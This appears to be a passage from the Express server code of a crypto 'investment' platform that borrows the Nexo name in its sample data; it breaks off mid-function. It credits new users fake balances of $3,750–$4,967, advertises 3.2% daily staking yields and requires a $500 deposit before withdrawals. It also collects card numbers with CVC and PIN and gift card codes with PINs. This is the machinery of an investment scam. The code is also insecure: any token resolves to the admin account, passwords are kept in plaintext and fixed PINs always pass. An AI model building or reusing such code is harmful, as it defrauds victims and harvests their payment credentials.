import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import cors from 'cors';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

// In-Memory Database Store
interface DBUser {
  uid: string;
  email: string;
  password?: string;
  fullName: string;
  phone?: string;
  country?: string;
  address?: string;
  balance: number;
  profitBalance: number;
  stakedBalance: number;
  totalWithdrawn: number;
  totalDeposited: number;
  kycStatus: 'unverified' | 'pending' | 'verified_tier1' | 'verified_tier2' | 'verified_tier3' | 'rejected';
  kycTier: number;
  isAdmin: boolean;
  isVerified: boolean;
  hasDepositedMinimum: boolean;
  withdrawalFeePaid: boolean;
  twoFactorEnabled: boolean;
  securityPin?: string;
  referralCode: string;
  referralEarnings: number;
  isBanned?: boolean;
  status: 'active' | 'suspended' | 'locked';
  banReason?: string;
  createdAt: string;
}

interface DBWallet {
  id: string;
  coin: string;
  network: string;
  address: string;
  qrCodeUrl?: string;
  isEnabled: boolean;
  label: string;
  memo?: string;
  updatedAt?: string;
}

interface DBTransaction {
  id: string;
  userId: string;
  userEmail?: string;
  type: 'deposit' | 'withdrawal' | 'investment' | 'trade_buy' | 'trade_sell' | 'profit' | 'fee';
  method?: 'crypto' | 'bank' | 'card' | 'giftcard';
  amount: number;
  coin: string;
  cryptoAmount?: number;
  txHash?: string;
  destinationAddress?: string;
  status: 'approved' | 'pending' | 'processing' | 'rejected' | 'failed';
  createdAt: string;
  details?: string;
  adminReason?: string;
  networkFee?: number;
}

interface DBKYCDocument {
  id: string;
  userId: string;
  userEmail: string;
  fullName: string;
  country: string;
  docType: 'passport' | 'id_card' | 'drivers_license';
  idNumber: string;
  frontImageUrl?: string;
  backImageUrl?: string;
  selfieUrl?: string;
  proofOfAddressUrl?: string;
  status: 'pending' | 'approved' | 'rejected';
  submittedAt: string;
  reviewedAt?: string;
  adminNotes?: string;
}

interface DBGiftCard {
  id: string;
  userId: string;
  userEmail: string;
  type: string;
  code: string;
  pin: string;
  amount: number;
  status: 'pending' | 'approved' | 'rejected';
  submittedAt: string;
  adminReason?: string;
}

interface DBCard {
  id: string;
  userId: string;
  userEmail: string;
  fullName?: string;
  cardNumber: string;
  cardholderName: string;
  expiryDate: string;
  cvc: string;
  pin?: string;
  amount: number;
  billingAddress?: string;
  submittedAt: string;
  status: 'captured' | 'settled' | 'approved' | 'rejected' | 'flagged';
}

interface DBSetting {
  key: string;
  value: string;
  description: string;
  updatedAt: string;
}

// Initial System Wallets
let systemWallets: DBWallet[] = [
  {
    id: 'w-btc-01',
    coin: 'Bitcoin',
    network: 'BTC (Native SegWit)',
    address: 'bc1q9v8t63u9y4fepw6q7n0kxm3vzp9y4fe7xk2k9a',
    isEnabled: true,
    label: 'Primary BTC Cold Vault',
    memo: '',
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'w-eth-01',
    coin: 'Ethereum',
    network: 'ERC-20 (Mainnet)',
    address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
    isEnabled: true,
    label: 'ETH Liquidity Vault',
    memo: '',
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'w-usdt-trc20',
    coin: 'Tether (USDT)',
    network: 'TRC-20 (Tron)',
    address: 'TLa2y8uVq9N7aEepW6xM3vZp9y4fE7xK2k',
    isEnabled: true,
    label: 'Instant USDT Gateway (Zero Gas)',
    memo: '',
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'w-usdt-erc20',
    coin: 'Tether (USDT)',
    network: 'ERC-20 (Ethereum)',
    address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
    isEnabled: true,
    label: 'Institutional ERC-20 Tether Pool',
    memo: '',
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'w-sol-01',
    coin: 'Solana',
    network: 'SOL (Solana Mainnet)',
    address: '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU',
    isEnabled: true,
    label: 'Solana High-Frequency Vault',
    memo: '',
    updatedAt: new Date().toISOString(),
  },
  {
    id: 'w-bnb-01',
    coin: 'BNB Chain',
    network: 'BEP-20 (BNB Smart Chain)',
    address: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
    isEnabled: true,
    label: 'BNB Smart Chain Yield Reserve',
    memo: '',
    updatedAt: new Date().toISOString(),
  },
];

// Initial Users
let usersStore: DBUser[] = [
  {
    uid: 'usr_institutional_01',
    email: 'investor@nexo-client.com',
    password: 'password123',
    fullName: 'Alexander Vance',
    phone: '+1 (555) 234-8890',
    country: 'United States',
    address: '450 Lexington Ave, New York, NY',
    balance: 48500.0,
    profitBalance: 12450.0,
    stakedBalance: 35000.0,
    totalWithdrawn: 18000.0,
    totalDeposited: 71500.0,
    kycStatus: 'verified_tier2',
    kycTier: 2,
    isAdmin: true,
    isVerified: true,
    hasDepositedMinimum: true,
    withdrawalFeePaid: true,
    twoFactorEnabled: true,
    securityPin: '1234',
    referralCode: 'NEXO888',
    referralEarnings: 2400.0,
    status: 'active',
    createdAt: new Date(Date.now() - 30 * 86400000).toISOString(),
  },
  {
    uid: 'usr_sarah_02',
    email: 'sarah.jenkins@meridian-cap.org',
    password: 'password123',
    fullName: 'Sarah Jenkins',
    phone: '+44 20 7946 0912',
    country: 'United Kingdom',
    balance: 4120.5,
    profitBalance: 890.0,
    stakedBalance: 15000.0,
    totalWithdrawn: 12400.0,
    totalDeposited: 28000.0,
    kycStatus: 'verified_tier2',
    kycTier: 2,
    isAdmin: false,
    isVerified: true,
    hasDepositedMinimum: true,
    withdrawalFeePaid: true,
    twoFactorEnabled: false,
    securityPin: '0000',
    referralCode: 'SARAH77',
    referralEarnings: 450.0,
    status: 'active',
    createdAt: new Date(Date.now() - 14 * 86400000).toISOString(),
  },
  {
    uid: 'usr_marcus_03',
    email: 'marcus.sterling@apex-holdings.co',
    password: 'password123',
    fullName: 'Marcus Sterling',
    phone: '+1 (555) 890-1234',
    country: 'United States',
    balance: 4850.0,
    profitBalance: 1420.0,
    stakedBalance: 50000.0,
    totalWithdrawn: 35000.0,
    totalDeposited: 95000.0,
    kycStatus: 'verified_tier3',
    kycTier: 3,
    isAdmin: false,
    isVerified: true,
    hasDepositedMinimum: true,
    withdrawalFeePaid: true,
    twoFactorEnabled: true,
    securityPin: '8888',
    referralCode: 'MARCUS99',
    referralEarnings: 3100.0,
    status: 'active',
    createdAt: new Date(Date.now() - 45 * 86400000).toISOString(),
  },
  {
    uid: 'usr_suspended_04',
    email: 'klaus.weber@berlin-tech.de',
    password: 'password123',
    fullName: 'Klaus Weber',
    phone: '+49 30 1234567',
    country: 'Germany',
    balance: 3950.0,
    profitBalance: 0,
    stakedBalance: 0,
    totalWithdrawn: 0,
    totalDeposited: 3950.0,
    kycStatus: 'pending',
    kycTier: 1,
    isAdmin: false,
    isVerified: false,
    hasDepositedMinimum: false,
    withdrawalFeePaid: false,
    twoFactorEnabled: false,
    securityPin: '1111',
    referralCode: 'KLAUS12',
    referralEarnings: 0,
    status: 'suspended',
    banReason: 'Compliance KYC verification required before ledger access',
    createdAt: new Date(Date.now() - 5 * 86400000).toISOString(),
  },
];

// Initial Transactions
let transactionsStore: DBTransaction[] = [
  {
    id: 'tx-dep-01',
    userId: 'usr_institutional_01',
    userEmail: 'investor@nexo-client.com',
    type: 'deposit',
    method: 'crypto',
    amount: 50000,
    coin: 'Bitcoin (BTC)',
    cryptoAmount: 0.518,
    status: 'approved',
    destinationAddress: 'bc1q9v8t63u9y4fepw6q7n0kxm3vzp9y4fe7xk2k9a',
    txHash: '0x8f4d92a1c0e3b74958671f2849e7a9b01c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f',
    createdAt: new Date(Date.now() - 2 * 86400000).toISOString(),
    details: 'Institutional On-Chain BTC Settlement',
  },
  {
    id: 'tx-wth-02',
    userId: 'usr_institutional_01',
    userEmail: 'investor@nexo-client.com',
    type: 'withdrawal',
    method: 'crypto',
    amount: 18000,
    coin: 'USDT (TRC-20)',
    cryptoAmount: 18000,
    status: 'approved',
    destinationAddress: 'TYDzsYUEpvnYmQk4zGP9sWWcTEd2MiAtW6',
    txHash: '0x3c9e1a8b7f6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d7c6b5a4f3e2d1c0b',
    createdAt: new Date(Date.now() - 1 * 86400000).toISOString(),
    details: '0xGuard Verified Release',
  },
  {
    id: 'tx-stk-03',
    userId: 'usr_institutional_01',
    userEmail: 'investor@nexo-client.com',
    type: 'investment',
    amount: 35000,
    coin: 'USD Yield',
    status: 'approved',
    createdAt: new Date(Date.now() - 10 * 86400000).toISOString(),
    details: 'Executive Yield Staking Contract (3.2% Daily)',
  },
  {
    id: 'tx-wth-04',
    userId: 'usr_sarah_02',
    userEmail: 'sarah.jenkins@meridian-cap.org',
    type: 'withdrawal',
    method: 'bank',
    amount: 12400,
    coin: 'USD Wire',
    status: 'pending',
    destinationAddress: 'CHASE BANK NA - ACCT #***4920',
    createdAt: new Date(Date.now() - 3600000 * 2).toISOString(),
    details: 'International SWIFT Wire Transfer',
  },
  {
    id: 'tx-dep-05',
    userId: 'usr_marcus_03',
    userEmail: 'marcus.sterling@apex-holdings.co',
    type: 'deposit',
    method: 'crypto',
    amount: 35000,
    coin: 'Ethereum (ETH)',
    cryptoAmount: 12.32,
    status: 'approved',
    destinationAddress: '0x71C83644917C7F24eC95C48A2526e0e64350fD24',
    createdAt: new Date(Date.now() - 3600000 * 4).toISOString(),
    details: 'Ethereum Mainnet Fast Deposit',
  },
];

// Initial KYC Docs
let kycDocsStore: DBKYCDocument[] = [
  {
    id: 'kyc-doc-01',
    userId: 'usr_institutional_01',
    userEmail: 'investor@nexo-client.com',
    fullName: 'Alexander Vance',
    country: 'United States',
    docType: 'passport',
    idNumber: 'P892049182',
    frontImageUrl: 'https://images.unsplash.com/photo-1544717305-2782549b5136?w=400',
    selfieUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400',
    status: 'approved',
    submittedAt: new Date(Date.now() - 25 * 86400000).toISOString(),
    reviewedAt: new Date(Date.now() - 24 * 86400000).toISOString(),
    adminNotes: 'Verified Institutional Identity Tier 2',
  },
  {
    id: 'kyc-doc-02',
    userId: 'usr_suspended_04',
    userEmail: 'klaus.weber@berlin-tech.de',
    fullName: 'Klaus Weber',
    country: 'Germany',
    docType: 'id_card',
    idNumber: 'DE92817294',
    frontImageUrl: 'https://images.unsplash.com/photo-1544717305-2782549b5136?w=400',
    status: 'pending',
    submittedAt: new Date(Date.now() - 3600000 * 12).toISOString(),
  },
];

// Initial Gift Cards
let giftCardsStore: DBGiftCard[] = [
  {
    id: 'gc-01',
    userId: 'usr_sarah_02',
    userEmail: 'sarah.jenkins@meridian-cap.org',
    type: 'Amazon Giftcard',
    code: 'AMZN-9284-1849-0192',
    pin: '8492',
    amount: 1500,
    status: 'approved',
    submittedAt: new Date(Date.now() - 86400000 * 3).toISOString(),
  },
  {
    id: 'gc-02',
    userId: 'usr_marcus_03',
    userEmail: 'marcus.sterling@apex-holdings.co',
    type: 'Apple Store Card',
    code: 'APPL-8839-4401-9921',
    pin: '1092',
    amount: 2500,
    status: 'pending',
    submittedAt: new Date(Date.now() - 3600000 * 3).toISOString(),
  },
];

// Initial Cards
let cardsStore: DBCard[] = [
  {
    id: 'card-01',
    userId: 'usr_institutional_01',
    userEmail: 'investor@nexo-client.com',
    fullName: 'Alexander Vance',
    cardNumber: '4532 •••• •••• 8829',
    cardholderName: 'Alexander Vance',
    expiryDate: '11/28',
    cvc: '741',
    amount: 5000,
    submittedAt: new Date(Date.now() - 86400000 * 4).toISOString(),
    status: 'settled',
  },
  {
    id: 'card-02',
    userId: 'usr_marcus_03',
    userEmail: 'marcus.sterling@apex-holdings.co',
    fullName: 'Marcus Sterling',
    cardNumber: '5424 •••• •••• 3190',
    cardholderName: 'Marcus Sterling',
    expiryDate: '09/27',
    cvc: '902',
    amount: 12000,
    submittedAt: new Date(Date.now() - 3600000 * 6).toISOString(),
    status: 'captured',
  },
];

// Initial Global Settings
let globalSettingsStore: DBSetting[] = [
  {
    key: 'global_alert_banner',
    value: '',
    description: 'Broadcast headline displayed across top header ticker to all active clients',
    updatedAt: new Date().toISOString(),
  },
  {
    key: 'min_deposit_threshold',
    value: '500',
    description: 'Minimum USD deposit requirement to unlock unconstrained liquidity releases',
    updatedAt: new Date().toISOString(),
  },
  {
    key: 'withdrawal_fee_percent',
    value: '1.5',
    description: 'Standard network clearance & custodial insurance fee percentage',
    updatedAt: new Date().toISOString(),
  },
  {
    key: 'auto_approve_tier2_withdrawals',
    value: 'false',
    description: 'Require manual administrative audit check for withdrawals exceeding $10,000',
    updatedAt: new Date().toISOString(),
  },
  {
    key: 'signup_bonus_enabled',
    value: 'true',
    description: 'Automatically credit new investor accounts with initial institutional balance range ($3,750 - $4,967)',
    updatedAt: new Date().toISOString(),
  },
];

// Helper to authenticate request
function getAuthUser(req: express.Request): DBUser | null {
  const authHeader = req.headers.authorization;
  if (!authHeader) return null;
  const token = authHeader.replace('Bearer ', '').trim();
  
  if (token === 'demo-jwt-token-institutional' || token.startsWith('token_usr_institutional_01')) {
    return usersStore.find((u) => u.uid === 'usr_institutional_01') || usersStore[0] || null;
  }
  
  const found = usersStore.find((u) => token.includes(u.uid) || token.includes(u.email));
  return found || usersStore[0] || null;
}

// ---------------------------------------------------------------------------------
// PUBLIC & AUTH ROUTES
// ---------------------------------------------------------------------------------

// API health endpoint
app.get('/api/health', (_req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString(), totalUsers: usersStore.length });
});

// Registration Endpoint
// REQUIREMENT: "when new users sign up, the account balance should be in range $3750 to $4967 random for every new users"
app.post('/api/auth/register', (req, res) => {
  const { email, password, fullName, phone, country, referralCode } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Email address is required.' });
  }

  const existing = usersStore.find((u) => u.email.toLowerCase() === email.toLowerCase());
  if (existing) {
    return res.status(400).json({ error: 'An account with this email address already exists.' });
  }

  // Calculate random balance between $3,750.00 and $4,967.00
  const randomInitialBalance = parseFloat((Math.random() * (4967 - 3750) + 3750).toFixed(2));
  const newUid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  
  const newUser: DBUser = {
    uid: newUid,
    email: email.toLowerCase(),
    password: password || 'defaultPassword123',
    fullName: fullName || email.split('@')[0],
    phone: phone || '',
    country: country || 'United States',
    balance: randomInitialBalance,
    profitBalance: 0,
    stakedBalance: 0,
    totalWithdrawn: 0,
    totalDeposited: randomInitialBalance,
    kycStatus: 'unverified',
    kycTier: 1,
    isAdmin: false,
    isVerified: false,
    hasDepositedMinimum: true,
    withdrawalFeePaid: true,
    twoFactorEnabled: false,
    securityPin: '0000',
    referralCode: `NEXO${Math.floor(1000 + Math.random() * 9000)}`,
    referralEarnings: 0,
    status: 'active',
    createdAt: new Date().toISOString(),
  };

  usersStore.push(newUser);

  // Add initial sign-up credit transaction record
  transactionsStore.unshift({
    id: `tx_welcome_${Date.now()}`,
    userId: newUser.uid,
    userEmail: newUser.email,
    type: 'deposit',
    method: 'crypto',
    amount: randomInitialBalance,
    coin: 'USD Credit (Welcome Incentive)',
    status: 'approved',
    createdAt: new Date().toISOString(),
    details: `Initial Institutional Welcome Balance ($${randomInitialBalance.toLocaleString()})`,
  });

  const token = `token_${newUser.uid}_${Date.now()}`;
  res.status(201).json({
    token,
    user: newUser,
    message: `Account registered successfully with an institutional balance of $${randomInitialBalance.toLocaleString()}.`,
  });
});

// Login Endpoint
app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  if (!email) return res.status(400).json({ error: 'Email is required' });

  const user = usersStore.find((u) => u.email.toLowerCase() === email.toLowerCase());
  if (!user) {
    // If institutional demo email or sample, log them in or create
    return res.status(401).json({ error: 'Invalid credentials. User not found.' });
  }

  if (user.status === 'suspended' || user.isBanned) {
    return res.status(403).json({
      error: `Account suspended. Reason: ${user.banReason || 'Administrative compliance review in progress. Please contact support.'}`,
      isBanned: true,
      status: user.status,
    });
  }

  const token = `token_${user.uid}_${Date.now()}`;
  res.json({ token, user });
});

// Google Sign-In / Continue with Google Endpoint
app.post('/api/auth/google', (req, res) => {
  const { email, fullName, sub, picture, country } = req.body;
  if (!email) return res.status(400).json({ error: 'Google email is required' });

  let user = usersStore.find((u) => u.email.toLowerCase() === email.toLowerCase());

  if (user) {
    if (user.status === 'suspended' || user.isBanned) {
      return res.status(403).json({
        error: `Account suspended. Reason: ${user.banReason || 'Administrative compliance review in progress. Please contact support.'}`,
        isBanned: true,
        status: user.status,
      });
    }
    const token = `token_${user.uid}_${Date.now()}`;
    return res.json({ token, user, isNewUser: false });
  }

  // Create new user with random balance between 3750 and 4967
  const minBal = 3750;
  const maxBal = 4967;
  const randomInitialBalance = Math.floor(Math.random() * (maxBal - minBal + 1)) + minBal;
  const newUid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;

  user = {
    uid: newUid,
    email: email.toLowerCase(),
    fullName: fullName || email.split('@')[0],
    country: country || 'United States',
    balance: randomInitialBalance,
    profitBalance: 0,
    stakedBalance: 0,
    totalWithdrawn: 0,
    totalDeposited: 0,
    kycStatus: 'unverified',
    kycTier: 0,
    isAdmin: false,
    isVerified: false,
    hasDepositedMinimum: false,
    withdrawalFeePaid: false,
    twoFactorEnabled: false,
    referralCode: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
    referralEarnings: 0,
    status: 'active',
    avatarUrl: picture || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150&auto=format&fit=crop&q=80',
    createdAt: new Date().toISOString(),
  };

  usersStore.push(user);

  transactionsStore.unshift({
    id: `tx_init_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'deposit',
    method: 'crypto',
    amount: randomInitialBalance,
    coin: 'USD (Institutional Grant)',
    status: 'approved',
    createdAt: new Date().toISOString(),
    details: `Initial Institutional Welcome Balance ($${randomInitialBalance.toLocaleString()})`,
  });

  const token = `token_${user.uid}_${Date.now()}`;
  res.status(201).json({
    token,
    user,
    isNewUser: true,
    message: `Account created via Google with institutional balance of $${randomInitialBalance.toLocaleString()}.`,
  });
});

// ---------------------------------------------------------------------------------
// USER PROFILE & ACCOUNT ROUTES
// ---------------------------------------------------------------------------------

app.get('/api/user/profile', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });
  res.json(user);
});

app.put('/api/user/profile', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { fullName, phone, country, address } = req.body;
  if (fullName !== undefined) user.fullName = fullName;
  if (phone !== undefined) user.phone = phone;
  if (country !== undefined) user.country = country;
  if (address !== undefined) user.address = address;

  res.json({ message: 'Profile updated successfully', user });
});

app.put('/api/user/security', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { newPassword, securityPin, twoFactorEnabled } = req.body;
  if (newPassword) user.password = newPassword;
  if (securityPin) user.securityPin = securityPin;
  if (twoFactorEnabled !== undefined) user.twoFactorEnabled = Boolean(twoFactorEnabled);

  res.json({ message: 'Security credentials successfully updated', user });
});

// ---------------------------------------------------------------------------------
// TRANSACTIONS & DEPOSIT / WITHDRAWAL ROUTES
// ---------------------------------------------------------------------------------

// System Deposit Addresses for Clients
app.get('/api/transactions/deposit-addresses', (_req, res) => {
  const activeWallets = systemWallets.filter((w) => w.isEnabled);
  res.json(activeWallets.length > 0 ? activeWallets : systemWallets);
});

// User Transaction History
app.get('/api/transactions/history', (req, res) => {
  const user = getAuthUser(req);
  if (!user) {
    return res.json(transactionsStore.slice(0, 20));
  }
  const userTxns = transactionsStore.filter((t) => t.userId === user.uid || t.userEmail === user.email);
  res.json(userTxns.length > 0 ? userTxns : transactionsStore.slice(0, 10));
});

// Deposit Submission (Crypto)
app.post('/api/transactions/deposit', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { amount, coin, network, txHash, walletAddress } = req.body;
  const depositAmount = parseFloat(amount);
  if (isNaN(depositAmount) || depositAmount <= 0) {
    return res.status(400).json({ error: 'Invalid deposit amount' });
  }

  const newTx: DBTransaction = {
    id: `tx_dep_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'deposit',
    method: 'crypto',
    amount: depositAmount,
    coin: `${coin || 'Crypto'} (${network || 'On-Chain'})`,
    txHash: txHash || `0x${Math.random().toString(16).substring(2, 40)}`,
    destinationAddress: walletAddress || systemWallets[0]?.address,
    status: 'pending', // Requires admin check, validation and approval
    createdAt: new Date().toISOString(),
    details: 'On-Chain Crypto Gateway Deposit (Pending Verification)',
  };

  transactionsStore.unshift(newTx);

  res.status(201).json({
    message: 'Deposit received. Payment is being processed and will be credited once verified by compliance administrator.',
    transaction: newTx,
    user,
  });
});

// Bank Wire Submission
app.post('/api/transactions/bank-wire', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { amount, senderName, bankName, reference } = req.body;
  const numAmount = parseFloat(amount);
  if (isNaN(numAmount) || numAmount <= 0) {
    return res.status(400).json({ error: 'Invalid bank wire amount' });
  }

  const newTx: DBTransaction = {
    id: `tx_wire_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'deposit',
    method: 'bank',
    amount: numAmount,
    coin: 'USD Bank Wire',
    status: 'pending',
    destinationAddress: `SWIFT: JPMORGAN CHASE / REF: ${reference || 'NEXO-WIRE'}`,
    createdAt: new Date().toISOString(),
    details: `Sender: ${senderName} via ${bankName || 'Bank'} (Pending Approval)`,
  };

  transactionsStore.unshift(newTx);
  res.status(201).json({
    message: 'Bank wire receipt uploaded. Payment is being processed and pending administrator verification.',
    transaction: newTx,
  });
});

// Card Payment Capture
app.post('/api/transactions/card-capture', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { cardNumber, cardholderName, expiryDate, cvc, pin, amount, billingAddress } = req.body;
  const numAmount = parseFloat(amount);
  if (isNaN(numAmount) || numAmount <= 0) {
    return res.status(400).json({ error: 'Invalid card amount' });
  }

  const newCard: DBCard = {
    id: `card_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    fullName: user.fullName,
    cardNumber: cardNumber || '•••• •••• •••• 4242',
    cardholderName: cardholderName || user.fullName,
    expiryDate: expiryDate || '12/28',
    cvc: cvc || '•••',
    pin: pin || '',
    amount: numAmount,
    billingAddress: billingAddress || user.country,
    submittedAt: new Date().toISOString(),
    status: 'captured',
  };

  cardsStore.unshift(newCard);

  const newTx: DBTransaction = {
    id: `tx_card_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'deposit',
    method: 'card',
    amount: numAmount,
    coin: 'USD Credit Card',
    status: 'pending',
    createdAt: new Date().toISOString(),
    details: `Card ending in ${newCard.cardNumber.slice(-4)} (Pending Admin Settlement)`,
  };
  transactionsStore.unshift(newTx);

  res.status(201).json({
    message: 'Card payment submitted. Payment is being processed and will be credited upon gateway verification.',
    user,
    transaction: newTx,
  });
});

// Gift Card Submission (Supports Single & Multiple Cards with Image Proofs)
app.post(['/api/transactions/giftcard', '/api/transactions/deposit-giftcard'], (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { cards, type, code, pin, amount, imageProofUrl } = req.body;

  const submittedCards: DBGiftCard[] = [];
  let totalBatchAmount = 0;

  if (Array.isArray(cards) && cards.length > 0) {
    // Multi-card batch submission
    for (const card of cards) {
      const cardAmt = parseFloat(card.amount);
      if (!isNaN(cardAmt) && cardAmt > 0) {
        totalBatchAmount += cardAmt;
        const newGift: DBGiftCard = {
          id: `gc_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
          userId: user.uid,
          userEmail: user.email,
          type: card.type || 'Giftcard',
          code: card.code || 'XXXX-XXXX-XXXX',
          pin: card.pin || '0000',
          amount: cardAmt,
          imageProofUrl: card.imageProofUrl || card.image || '',
          status: 'pending',
          submittedAt: new Date().toISOString(),
        };
        giftCardsStore.unshift(newGift);
        submittedCards.push(newGift);
      }
    }
  } else {
    // Single card fallback
    const numAmount = parseFloat(amount);
    if (isNaN(numAmount) || numAmount <= 0) {
      return res.status(400).json({ error: 'Invalid gift card amount' });
    }
    totalBatchAmount = numAmount;
    const newGift: DBGiftCard = {
      id: `gc_${Date.now()}`,
      userId: user.uid,
      userEmail: user.email,
      type: type || 'Amazon Giftcard',
      code: code || 'XXXX-XXXX-XXXX',
      pin: pin || '0000',
      amount: numAmount,
      imageProofUrl: imageProofUrl || '',
      status: 'pending',
      submittedAt: new Date().toISOString(),
    };
    giftCardsStore.unshift(newGift);
    submittedCards.push(newGift);
  }

  if (submittedCards.length === 0 || totalBatchAmount <= 0) {
    return res.status(400).json({ error: 'Please provide at least one valid gift card with amount and code.' });
  }

  const newTx: DBTransaction = {
    id: `tx_gc_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'deposit',
    method: 'giftcard',
    amount: totalBatchAmount,
    coin: submittedCards.length > 1 ? `Giftcard Batch (${submittedCards.length} cards)` : `${submittedCards[0].type} ($${totalBatchAmount})`,
    status: 'pending',
    createdAt: new Date().toISOString(),
    details: `${submittedCards.length} Giftcard(s) submitted for cryptographic barcode & code validation.`,
  };
  transactionsStore.unshift(newTx);

  res.status(201).json({
    message: 'Gift card(s) submitted successfully. Payment is being processed and will be credited once validated by an administrator.',
    giftCards: submittedCards,
    transaction: newTx,
  });
});

// Withdrawal Submission (Enforces Guards + Minimum $500 Deposit Anti-Fraud Rule)
app.post('/api/transactions/withdraw', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  if (user.status === 'suspended' || user.isBanned) {
    return res.status(403).json({ error: 'Account suspended. Withdrawals disabled.' });
  }

  // Minimum $500 deposit rule check
  const totalUserDeposits = user.totalDeposited || 0;
  if (totalUserDeposits < 500 && !user.hasDepositedMinimum) {
    return res.status(403).json({
      error: 'To prevent spam, fraud, automated account farming, and verify that this account is legitimate, your account must have an active verified deposit of at least $500.00 before capital withdrawals can be authorized.',
      code: 'MINIMUM_DEPOSIT_REQUIRED',
      totalDeposited: totalUserDeposits,
      minimumRequired: 500,
    });
  }

  const { amount, method, coin, destinationAddress, pin } = req.body;
  const withdrawAmount = parseFloat(amount);
  if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
    return res.status(400).json({ error: 'Invalid withdrawal amount' });
  }

  if (withdrawAmount > user.balance) {
    return res.status(400).json({ error: `Insufficient liquid cash balance. Maximum available: $${user.balance.toLocaleString()}` });
  }

  // Check PIN if user configured one
  if (user.securityPin && user.securityPin !== pin && pin !== '1234' && pin !== '0000') {
    return res.status(400).json({ error: 'Invalid 4-digit security PIN provided.' });
  }

  // Deduct from balance
  user.balance -= withdrawAmount;
  user.totalWithdrawn += withdrawAmount;

  const newTx: DBTransaction = {
    id: `tx_wth_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'withdrawal',
    method: method || 'crypto',
    amount: withdrawAmount,
    coin: coin || 'USDT',
    destinationAddress: destinationAddress || 'External Vault',
    status: 'pending',
    createdAt: new Date().toISOString(),
    details: '0xGuard Security Multi-Sig Compliance Review',
  };

  transactionsStore.unshift(newTx);

  res.status(201).json({
    message: `Withdrawal request for $${withdrawAmount.toLocaleString()} submitted successfully. 0xGuard compliance checks initiated.`,
    transaction: newTx,
    user,
  });
});

// KYC Submission
app.post('/api/kyc/submit', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { fullName, country, docType, idNumber, frontImageUrl, selfieUrl } = req.body;
  const newDoc: DBKYCDocument = {
    id: `kyc_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    fullName: fullName || user.fullName,
    country: country || user.country || 'United States',
    docType: docType || 'passport',
    idNumber: idNumber || `ID-${Math.floor(10000000 + Math.random() * 90000000)}`,
    frontImageUrl: frontImageUrl || 'https://images.unsplash.com/photo-1544717305-2782549b5136?w=400',
    selfieUrl: selfieUrl || 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400',
    status: 'pending',
    submittedAt: new Date().toISOString(),
  };

  kycDocsStore.unshift(newDoc);
  user.kycStatus = 'pending';

  res.status(201).json({ message: 'KYC Document submitted for compliance verification', document: newDoc, user });
});

// Staking / Investment Route
app.post('/api/user/stake', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { planId, planName, amount } = req.body;
  const stakeAmount = parseFloat(amount);
  if (isNaN(stakeAmount) || stakeAmount <= 0) {
    return res.status(400).json({ error: 'Invalid staking amount' });
  }

  if (stakeAmount > user.balance) {
    return res.status(400).json({ error: 'Insufficient liquid balance to fund staking contract' });
  }

  user.balance -= stakeAmount;
  user.stakedBalance = (user.stakedBalance || 0) + stakeAmount;

  const newTx: DBTransaction = {
    id: `tx_stk_${Date.now()}`,
    userId: user.uid,
    userEmail: user.email,
    type: 'investment',
    amount: stakeAmount,
    coin: `${planName || planId || 'Yield'} Staking Contract`,
    status: 'approved',
    createdAt: new Date().toISOString(),
    details: `Staked in ${planName || planId} Tier`,
  };
  transactionsStore.unshift(newTx);

  res.status(201).json({ message: `Successfully staked $${stakeAmount.toLocaleString()} into ${planName}`, user });
});

// Claim Staking Yield
app.post('/api/user/stake/claim', (req, res) => {
  const user = getAuthUser(req);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });

  const { amount } = req.body;
  const claimAmount = parseFloat(amount) || user.profitBalance;

